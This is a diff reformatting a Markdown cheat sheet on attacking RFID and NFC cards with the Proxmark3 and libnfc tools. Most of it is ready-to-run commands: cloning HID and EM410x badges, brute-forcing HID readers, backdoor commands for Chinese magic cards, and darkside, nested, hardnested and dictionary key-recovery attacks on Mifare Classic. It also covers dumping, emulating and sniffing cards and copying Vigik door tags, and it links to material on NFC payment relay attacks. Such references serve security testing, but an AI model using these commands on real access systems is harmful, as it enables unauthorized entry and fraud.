@@ -1,9 +1,14 @@
-# Radio Frequency Identification (RFID) & Near Field Communication (NFC)
+# NFC - RFID
 
-### Install and configuration
+> Radio Frequency Identification (RFID) & Near Field Communication (NFC)
 
-Dependencies to install first :\
-`sudo apt-get install p7zip git build-essential libreadline5 libreadline-dev libusb-0.1-4 libusb-dev libqt4-dev perl pkg-config wget libncurses5-dev gcc-arm-none-eabi libstdc++-arm-none-eabi-newlib ncurses-dev libpcsclite-dev pcscd`
+
+## Install and configuration
+
+Dependencies to install first
+```ps1
+sudo apt-get install p7zip git build-essential libreadline5 libreadline-dev libusb-0.1-4 libusb-dev libqt4-dev perl pkg-config wget libncurses5-dev gcc-arm-none-eabi libstdc++-arm-none-eabi-newlib ncurses-dev libpcsclite-dev pcscd
+```
 
 Cloning and building the tool.
 
@@ -36,7 +41,8 @@ Embedded Processor: ARM7TDMI
 
 If the `ACR122` doesn't work properly, try `sudo rmmod pn533_usb`
 
-#### Update and flash
+
+### Update and flash
 
 In order to update and flash your proxmark you have to kill the `ModemManager` process as it is interfering with the process.
 
@@ -59,14 +65,14 @@ make armsrc/obj/fullimage.elf bootrom/obj/bootrom.elf client/flasher
 ./client/flasher /dev/ttyACM0 -b bootrom/obj/bootrom.elf armsrc/obj/fullimage.elf
 ```
 
-### Notes about card types
+## Notes about card types
 
 * **MIFARE Classic 1K/4K**: basically just a memory storage device. This memory, either 1024 or 4096 bytes, is divided into sectors and blocks. Most of the time used for regular access badges and has really simple security mechanisms for access control
 * **MIFARE Ultralight**: a 64 bytes version of MIFARE Classic. It’s low costs make it widely used as disposable tickets for events or transportation.
 * **MIFARE Plus**: announced as a replacement of MIFARE Classic. The Plus subfamily brings the new level of security up to 128-bit AES encryption.
 * **MIFARE DESFire**: those tags come pre-programmed with a general purpose DESFire operating system which offers a simple directory structure and files, and are the type of MIFARE offering the highest security levels.
 
-### LF - HID & Indala
+## LF - HID & Indala
 
 > Cloning requires writable T55xx card. The T55x7 card can be configured to emulate many of the 125 kHz tags.
 
@@ -86,7 +92,7 @@ lf hitag info
 lf hitag sim c378181c_a8f7.ht2   # simulate HiTag
 ```
 
-### LF - EM410X
+## LF - EM410X
 
 Read only memory :/
 
@@ -96,9 +102,9 @@ EM410x Tag ID: 23004d4dee
 Proxmark> lf em4x em410xsim 23004d4dee
 ```
 
-### HID : Example - Card
+## HID : Example - Card
 
-#### HID card format
+### HID card format
 
 ```powershell
 proxmark3> lf hid decode 10001fc656
@@ -114,7 +120,7 @@ Facility Code: 1
 -------------------------------------------------- 
 ```
 
-#### Write an HID card
+### Write an HID card
 
 ```powershell
 # version with facility code is better
@@ -144,7 +150,7 @@ proxmark3> lf hid encode H10302 c 220577
 HID Prox TAG ID: 100006bb43  
 ```
 
-#### Bruteforce an HID reader
+### Bruteforce an HID reader
 
 ```powershell
 pm3 --> lf hid brute a 26 f 224
@@ -159,7 +165,7 @@ d <delay>         :  delay betweens attempts in ms. Default 1000ms
 v                 :  verbose logging, show all tries
 ```
 
-### HF - Mifare DESFire
+## HF - Mifare DESFire
 
 > No known attacks yet ! Unencrypted sectors can be read, also you can try to look for default keys. All MIFARE cards are prone to relay attack.
 
@@ -173,13 +179,13 @@ v                 :  verbose logging, show all tries
 * Mifare DESFire EV1 : the challenge is done with AES or 3DES.
 * Mifare DESFire EV2
 
-### HF - Mifare Ultra Light
+## HF - Mifare Ultra Light
 
 * Ultralight C (3DES authentication)
 * Ultralight EV1
 * NTAG2
 
-#### Chinese backdoor
+### Chinese backdoor
 
 ```powershell
 pm3 --> hf 14a raw -p -b 7 40
@@ -193,17 +199,17 @@ pm3 --> hf 14a raw -p -c a20059982120
 0x44, fills card with 0x55
 ```
 
-#### Simulate
+### Simulate
 
 ```powershell
 hf 14a sim 2 <7-byte tag>
 ```
 
-### HF - Mifare Classic 1k
+## HF - Mifare Classic 1k
 
 New method for Proxmark : `hf mf autopwn`
 
-#### Darkside attack (PRNG Weak)
+### Darkside attack (PRNG Weak)
 
 **Proxmark method**
 
@@ -227,7 +233,7 @@ mfcuk -C -R 0:A -v 3 -s 250 -S 250
 mfcuk -C -R 3:A -v 3 -s 250 -S 250 -o mycard.mfc
 ```
 
-#### Nested attack (PRNG Weak)
+### Nested attack (PRNG Weak)
 
 > Need to find a default key to extract the others
 
@@ -260,7 +266,7 @@ nfc-mfclassic w a key.mfd data.mfd # write data
 nfc-mfclassic W a key.mfd data.mfd # write data and sector 0
 ```
 
-#### Hardnested attack
+### Hardnested attack
 
 > One key is needed in order to use this attack
 
@@ -301,7 +307,7 @@ Found key: c44e2b5e4ce3
 Tested 21232975852 states
 ```
 
-#### Magic Chinese Card - Acronyms
+### Magic Chinese Card - Acronyms
 
 **UID** - The original Chinese Magic Backdoor card. These cards respond to the backdoor commands and will show Chinese magic backdoor commands (GEN 1a) detected when you do an hf search. These cards can be detected by probing the card to see if it responds to the backdoor commands. Some RFID systems may try to detect these cards.
 
@@ -311,11 +317,11 @@ Tested 21232975852 states
 
 **UFUID** - This type of card is apparently a "better" version of the FUID card. Instead of only allowing Block 0 to be written once, you can write to it many times and then lock the block later when you're happy with the result. After locking Block 0, it cannot be unlocked to my knowledge. I do not think there is currently a way to lock these cards using the Proxmark3.
 
-#### Magic Chinese Card - GEN 2
+### Magic Chinese Card - GEN 2
 
 They can be copied directly. The software allows a new UID.
 
-#### Magic Chinese Card - GEN 1a
+### Magic Chinese Card - GEN 1a
 
 > **Works better on the official client.py instead of the iceman fork.**
 
@@ -338,7 +344,7 @@ struct.pack('<I',2910621770).encode('hex')
 '4a907cad'
 ```
 
-#### Unbricking Chinese Magic Mifare Classic
+### Unbricking Chinese Magic Mifare Classic
 
 If you set the wrong BCC for UID and can't read the card anymore, you can use some backdoor commands to change sector 0 using Proxmark:
 
@@ -349,7 +355,7 @@ hf 14a raw -p -c a0 00
 hf 14a raw -p -c de ad be ef 22 08 04 00 46 59 25 58 49 10 23 02
 ```
 
-#### Key Bruteforce/Dictionary attack
+### Key Bruteforce/Dictionary attack
 
 ```powershell
 hf mf chk *1 ? t                # Default keys
@@ -357,7 +363,7 @@ hf mf chk *1 ? d default_keys.dic
 hf mf chk 0 A default_keys.dic  # Dictionary attack with file: default_keys.dic
 ```
 
-#### Write and read sectors
+### Write and read sectors
 
 > Avoid writing wrbl 3 (contains key A/B + permissions)
 
@@ -370,7 +376,7 @@ proxmark3> hf mf wrbl 2 a ffffffffffff 464c4147313a4d31664072335f303037
 hf mf rdsc <sector number> <key A/B> <key (12 hex symbols)>
 ```
 
-#### Dump Mifare card
+### Dump Mifare card
 
 ```powershell
 proxmark3> hf mf dump 1 k hf-mf-A29558E4-key.bin f hf-mf-A29558E4-data.bin
@@ -380,7 +386,7 @@ k <name>     : key filename, if no <name> given, UID will be used as filename
 f <name>     : data filename, if no <name> given, UID will be used as filename
 ```
 
-#### Simulate and emulate Mifare card
+### Simulate and emulate Mifare card
 
 Emulate from a dump file
 
@@ -396,7 +402,7 @@ Simulate Mifare 1K UID
 proxmark3> hf mf sim u 353c2aa6
 ```
 
-#### MITM attack
+### MITM attack
 
 ```powershell
 hf 14a snoop
@@ -423,7 +429,7 @@ make
 ./mfkey64 xxxxxxxx 3b45a45a 7ddb6646 142fc1b9 9195fb3f
 ```
 
-#### Reader only attack
+### Reader only attack
 
 Emulate a MIFARE Classic with a DEADBEEF UID.
 
@@ -436,7 +442,7 @@ mf 1k sim uid: de ad be ef , numreads:0, flags:18 (0x12)
 #db# 4B UID: deadbeef
 ```
 
-#### Read a Mifare Dump
+### Read a Mifare Dump
 
 ```powershell
 pip install bitstring
@@ -444,9 +450,9 @@ git clone https://github.com/zhovner/mfdread
 mfdread.py ./dump.mfd
 ```
 
-### HF - Mifare Classic 4k
+## HF - Mifare Classic 4k
 
-#### Chinese Magic Mifare Classic 4K
+### Chinese Magic Mifare Classic 4K
 
 Block 0 is writable through normal Mifare Classic commands, i.e. there is not special “unlocked” read/write like in “magic Mifare 1k” version.
 
@@ -458,7 +464,7 @@ hf mf wrbl 0 a FFFFFFFFFFFF 01020304040000000000000000000000
 
 Again, watch out to have correct BCC and avoid Cascading Tag (0x88) as first byte of UID, or you may make the card unselectable (i.e. brick it).
 
-### HF - Vigik
+## HF - Vigik
 
 Tool : https://github.com/cjbrigato/kigiv-for-proxmark3/releases
 
@@ -471,21 +477,20 @@ mfoc -P 500 -O carte-originale.dmp # Copiez le contenu de la puce RFID d’origi
 nfc-mfclassic W a carte-originale.dmp carte-vierge.dmp # Ecrire le contenu de la puce originale sur la puce chinoise
 ```
 
-### Replay Attacks
+## Replay Attacks
+
 Replay attack is a technique where a malicious user could implement a device to intercept a NFC transaction and redeem it later, using other device or even in different location. 
 
-### Relay Attack
+
+## Relay Attack
 The relay attack is a technique where a malicious user implements a man in the middle attack. The attacker(APDUer) is capable to intercept, manipulate and change the transaction in real time to take advantage of it.  
 [https://en.wikipedia.org/wiki/Relay_attack](https://en.wikipedia.org/wiki/Relay_attack)
 
-### Intro to NFC Payment Relay Attacks
-[https://salmg.net/2018/12/01/intro-to-nfc-payment-relay-attacks/](https://salmg.net/2018/12/01/intro-to-nfc-payment-relay-attacks/)
+* NFC Payment Relay Attacks - [intro-to-nfc-payment-relay-attacks/](https://salmg.net/2018/12/01/intro-to-nfc-payment-relay-attacks/)
+* NFCopy85 is a 10 dollars device to make replay attacks against NFC payment systems - [nfcopy85](https://salmg.net/2019/06/16/nfcopy85/)
 
-### NFCopy85 is a 10 dollars device to make replay attacks against NFC payment systems
 
-[https://salmg.net/2019/06/16/nfcopy85/](https://salmg.net/2019/06/16/nfcopy85/)
-
-### References
+## References
 
 * https://blog.kchung.co/rfid-hacking-with-the-proxmark-3/
 * https://aur.archlinux.org/packages/proxmark3/
